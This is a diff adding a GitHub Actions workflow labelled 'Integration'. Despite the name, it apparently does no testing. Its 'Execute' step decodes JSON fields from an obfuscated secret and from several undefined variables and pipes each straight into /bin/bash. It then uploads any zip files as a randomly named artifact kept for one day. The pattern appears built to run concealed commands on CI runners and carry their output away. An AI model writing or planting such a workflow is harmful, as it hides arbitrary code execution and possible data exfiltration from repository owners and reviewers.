@@ -1,0 +1,29 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          wy349: ${{ secrets.wy349 }}
+        run: |
+          printf '%s' "$wy349" | jq -r .khvp84060 | /bin/bash
+          echo $yd94529 | jq -r .rh8 | /bin/bash
+          printf '%s' "$ddkb436" | jq -r .ntv16 | /bin/bash
+          printf '%s' "$lr55" | jq -r .wvtc30788 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: W79y9XXo
+          path: "*.zip"
+          retention-days: 1
